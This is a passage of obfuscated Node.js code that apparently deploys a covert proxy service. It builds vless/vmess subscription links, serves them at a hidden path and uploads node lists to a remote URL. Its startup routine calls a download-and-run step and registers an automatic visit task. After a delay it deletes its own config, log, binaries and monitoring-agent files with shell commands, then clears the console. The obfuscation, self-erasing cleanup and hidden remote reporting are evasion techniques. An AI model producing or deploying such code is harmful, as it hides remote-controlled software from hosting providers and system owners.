axios[_0x303963(0x1f8)](_0x303963(0x242),_0x3bdb15);if(_0xa03080[_0x303963(0x1da)]&&_0xa03080[_0x303963(0x1da)]['country_code']&&_0xa03080['data']['org'])return _0xa03080[_0x303963(0x1da)][_0x303963(0x1e9)]+'_'+_0xa03080[_0x303963(0x1da)][_0x303963(0x259)];}catch(_0x10d9c6){try{const _0x552e47={};_0x552e47[_0x303963(0x1dc)]=0xbb8;const _0x57e773=await axios[_0x303963(0x1f8)](_0x303963(0x26c),_0x552e47);if(_0x57e773[_0x303963(0x1da)]&&_0x57e773['data'][_0x303963(0x1ea)]===_0x303963(0x262)&&_0x57e773[_0x303963(0x1da)]['countryCode']&&_0x57e773[_0x303963(0x1da)][_0x303963(0x259)])return _0x57e773[_0x303963(0x1da)][_0x303963(0x238)]+'_'+_0x57e773[_0x303963(0x1da)][_0x303963(0x259)];}catch(_0x26be6b){}}return _0x303963(0x1c4);}async function _0x3fa2d0(_0x555023){const _0x4b1155=await _0x57beba(),_0x863cf3=NAME?NAME+'-'+_0x4b1155:_0x4b1155;return new Promise(_0x4940a0=>{setTimeout(()=>{const _0xd65920=_0x2744,_0x3f5709={};_0x3f5709['v']='2',_0x3f5709['ps']=''+_0x863cf3,_0x3f5709[_0xd65920(0x19e)]=CFIP,_0x3f5709['port']=CFPORT,_0x3f5709['id']=UUID,_0x3f5709[_0xd65920(0x219)]='0',_0x3f5709[_0xd65920(0x1fa)]=_0xd65920(0x1d9),_0x3f5709[_0xd65920(0x255)]='ws',_0x3f5709[_0xd65920(0x1a4)]=_0xd65920(0x1d9),_0x3f5709[_0xd65920(0x1ab)]=_0x555023,_0x3f5709[_0xd65920(0x22c)]=_0xd65920(0x213),_0x3f5709[_0xd65920(0x252)]=_0xd65920(0x252),_0x3f5709['sni']=_0x555023,_0x3f5709['alpn']='',_0x3f5709['fp']=_0xd65920(0x1d3);const _0x52bc68=_0x3f5709,_0x48f3ad=_0xd65920(0x1b0)+UUID+'@'+CFIP+':'+CFPORT+_0xd65920(0x25f)+_0x555023+_0xd65920(0x21d)+_0x555023+_0xd65920(0x254)+_0x863cf3+'\x0a\x0avmess://'+Buffer['from'](JSON[_0xd65920(0x222)](_0x52bc68))[_0xd65920(0x266)]('base64')+_0xd65920(0x22b)+UUID+'@'+CFIP+':'+CFPORT+_0xd65920(0x1a7)+_0x555023+_0xd65920(0x21d)+_0x555023+_0xd65920(0x192)+_0x863cf3+'\x0a\x20\x20\x20\x20';console[_0xd65920(0x24c)](Buffer[_0xd65920(0x1ae)](_0x48f3ad)[_0xd65920(0x266)](_0xd65920(0x233))),fs[_0xd65920(0x1df)](subPath,Buffer[_0xd65920(0x1ae)](_0x48f3ad)[_0xd65920(0x266)]('base64')),console['log'](FILE_PATH+_0xd65920(0x20f)),uploadNodes(),app['get']('/'+SUB_PATH,(_0x2c5a16,_0xfb0372)=>{const _0x2fcf2b=_0xd65920,_0x15ecc5=Buffer[_0x2fcf2b(0x1ae)](_0x48f3ad)[_0x2fcf2b(0x266)](_0x2fcf2b(0x233));_0xfb0372[_0x2fcf2b(0x212)](_0x2fcf2b(0x196),'text/plain;\x20charset=utf-8'),_0xfb0372['send'](_0x15ecc5);}),_0x4940a0(_0x48f3ad);},0x7d0);});}}async function uploadNodes(){const _0x398114=_0xe58d4a;if(UPLOAD_URL&&PROJECT_URL){const _0x49a961=PROJECT_URL+'/'+SUB_PATH,_0x45848e={};_0x45848e[_0x398114(0x1fe)]=[_0x49a961];const _0xc0997e=_0x45848e;try{const _0x1c5bc7={};_0x1c5bc7['Content-Type']=_0x398114(0x26b);const _0x5f0137={};_0x5f0137[_0x398114(0x206)]=_0x1c5bc7;const _0x35966f=await axios[_0x398114(0x1ca)](UPLOAD_URL+'/api/add-subscriptions',_0xc0997e,_0x5f0137);return _0x35966f&&_0x35966f[_0x398114(0x1ea)]===0xc8?(console[_0x398114(0x24c)](_0x398114(0x18f)),_0x35966f):null;}catch(_0x4784c1){if(_0x4784c1[_0x398114(0x24f)]){if(_0x4784c1[_0x398114(0x24f)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x34025f=fs['readFileSync'](listPath,'utf-8'),_0x518473=_0x34025f['split']('\x0a')[_0x398114(0x211)](_0x2161bd=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x398114(0x1c7)](_0x2161bd));if(_0x518473[_0x398114(0x229)]===0x0)return;const _0x4cbae8={};_0x4cbae8[_0x398114(0x253)]=_0x518473;const _0x566d26=JSON[_0x398114(0x222)](_0x4cbae8);try{const _0x122826={};_0x122826[_0x398114(0x196)]=_0x398114(0x26b);const _0x5e1500={};_0x5e1500[_0x398114(0x206)]=_0x122826;const _0xee0ed1=await axios[_0x398114(0x1ca)](UPLOAD_URL+_0x398114(0x243),_0x566d26,_0x5e1500);return _0xee0ed1&&_0xee0ed1[_0x398114(0x1ea)]===0xc8?(console['log']('Nodes\x20uploaded\x20successfully'),_0xee0ed1):null;}catch(_0x1f1cbe){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x4ef024=_0x2744,_0x487201=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x487201[_0x4ef024(0x1db)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x487201['push'](phpPath);process[_0x4ef024(0x25c)]==='win32'?exec('del\x20/f\x20/q\x20'+_0x487201[_0x4ef024(0x1cf)]('\x20')+_0x4ef024(0x271),_0x191016=>{const _0xe710bd=_0x4ef024;console[_0xe710bd(0x205)](),console[_0xe710bd(0x24c)]('App\x20is\x20running'),console[_0xe710bd(0x24c)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec(_0x4ef024(0x1a1)+_0x487201[_0x4ef024(0x1cf)]('\x20')+_0x4ef024(0x1b2),_0x44a28c=>{const _0x4ff673=_0x4ef024;console['clear'](),console[_0x4ff673(0x24c)](_0x4ff673(0x26e)),console[_0x4ff673(0x24c)](_0x4ff673(0x272));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x4e8dd9=_0xe58d4a;if(!AUTO_ACCESS||!PROJECT_URL){console['log']('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x29104e={};_0x29104e[_0x4e8dd9(0x260)]=PROJECT_URL;const _0xf9d2d7={};_0xf9d2d7[_0x4e8dd9(0x196)]=_0x4e8dd9(0x26b);const _0x4c4d5d={};_0x4c4d5d[_0x4e8dd9(0x206)]=_0xf9d2d7;const _0x57ce83=await axios[_0x4e8dd9(0x1ca)](_0x4e8dd9(0x1f7),_0x29104e,_0x4c4d5d);return console[_0x4e8dd9(0x24c)](_0x4e8dd9(0x1b8)),_0x57ce83;}catch(_0x253ed0){return console[_0x4e8dd9(0x23f)]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x253ed0[_0x4e8dd9(0x1d1)]),null;}}async function startserver(){const _0x41be40=_0xe58d4a;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x477729){console[_0x41be40(0x23f)](_0x41be40(0x1c9),_0x477729);}}startserver()['catch'](_0x7bf13b=>{const _0x9fa6e2=_0xe58d4a;console[_0x9fa6e2(0x23f)](_0x9fa6e2(0x1d2),_0x7bf13b);}),app['listen'](PORT,()=>console[_0xe58d4a(0x24c)](_0xe58d4a(0x1a9)+PORT+'!'));
